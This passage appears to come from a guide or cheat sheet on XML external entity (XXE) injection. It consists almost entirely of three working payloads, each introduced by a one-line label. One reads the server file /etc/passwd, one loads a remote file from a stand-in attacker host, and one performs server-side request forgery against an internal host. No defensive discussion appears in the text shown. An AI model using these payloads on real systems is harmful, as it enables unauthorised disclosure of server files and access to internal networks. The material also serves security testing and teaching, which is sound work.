- Injecting a local file on the server, such as /etc/passwd, into the XML document:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

- Injecting a remote file, such as a file hosted on a malicious server controlled by the attacker, into the XML document:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml" >]>
<foo>&xxe;</foo>
```

- Injecting a server-side request forgery (SSRF) attack to access internal network resources:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://internal.company.com/secret.php" >]>
<foo>&xxe;</foo>
```
